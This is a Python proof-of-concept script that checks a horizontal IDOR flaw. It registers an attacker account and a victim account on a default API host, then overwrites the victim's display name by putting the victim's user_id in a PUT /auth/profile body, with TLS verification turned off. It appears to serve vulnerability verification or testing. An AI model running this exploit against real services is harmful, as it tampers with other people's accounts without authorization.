     1	#!/usr/bin/env python3
     2	"""Verify: Horizontal IDOR on PUT /auth/profile via body user_id override.
     3	
     4	Registers two disposable accounts (attacker + victim) and checks whether an
     5	authenticated attacker can rewrite another user's display name by supplying
     6	`user_id` in the JSON body. Exits 0 (VULNERABLE) if the attacker's write
     7	lands on the victim row; exits 1 (NOT VULNERABLE) otherwise.
     8	
     9	Optional environment variables:
    10	    TARGET_URL          Base API URL (default: https://api.taintedport.com)
    11	
    12	Usage:
    13	    python3 verify.py
    14	"""
    15	import os, sys, time, requests, urllib3
    16	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    17	
    18	TARGET_URL = os.environ.get("TARGET_URL", "https://api.taintedport.com")
    19	
    20	
    21	def register(email, name="U"):
    22	    r = requests.post(f"{TARGET_URL}/auth/register",
    23	                      json={"name": name, "email": email, "password": "VerifyPw!2026"},
    24	                      verify=False, timeout=30)
    25	    r.raise_for_status()
    26	    j = r.json()
    27	    return j["token"], j["user"]["id"]
    28	
    29	
    30	def check():
    31	    ts = int(time.time())
    32	    try:
    33	        att_token, att_id = register(f"verify-att-{ts}@example.com", "AttOrig")
    34	        vic_token, vic_id = register(f"verify-vic-{ts}@example.com", "VicOrig")
    35	    except Exception as e:
    36	        print(f"[NOT VULNERABLE] setup failed: {e}")
    37	        sys.exit(1)
    38	
    39	    hijack = f"HIJACK-{ts}"
    40	    r = requests.put(f"{TARGET_URL}/auth/profile",
    41	                     headers={"Authorization": f"Bearer {att_token}"},
    42	                     json={"user_id": vic_id, "name": hijack},
    43	                     verify=False, timeout=30)
    44	
    45	    resp_user = {}
    46	    try:
    47	        resp_user = r.json().get("user", {}) or {}
    48	    except Exception:
    49	        pass
    50	
    51	    # Independent confirmation via the victim's own token
    52	    vc = requests.get(f"{TARGET_URL}/auth/me",
    53	                      headers={"Authorization": f"Bearer {vic_token}"},
    54	                      verify=False, timeout=30)
    55	    vic_name = ""
    56	    try:
    57	        vic_name = vc.json().get("user", {}).get("name", "")
    58	    except Exception:
    59	        pass
    60	
    61	    server_targeted_victim = (r.status_code == 200 and resp_user.get("id") == vic_id
    62	                              and resp_user.get("name") == hijack)
    63	    victim_row_actually_changed = (vc.status_code == 200 and vic_name == hijack)
    64	
    65	    if server_targeted_victim and victim_row_actually_changed:
    66	        print(f"[VULNERABLE] Attacker user_id={att_id} rewrote victim user_id={vic_id} "
    67	              f"display name to '{hijack}' via PUT /auth/profile body user_id override.")
    68	        sys.exit(0)
    69	    else:
    70	        print(f"[NOT VULNERABLE] PUT /auth/profile did not update the victim row "
    71	              f"(HTTP {r.status_code}, server user.id={resp_user.get('id')}, "
    72	              f"victim /auth/me name='{vic_name}').")
    73	        sys.exit(1)
    74	
    75	
    76	if __name__ == "__main__":
    77	    check()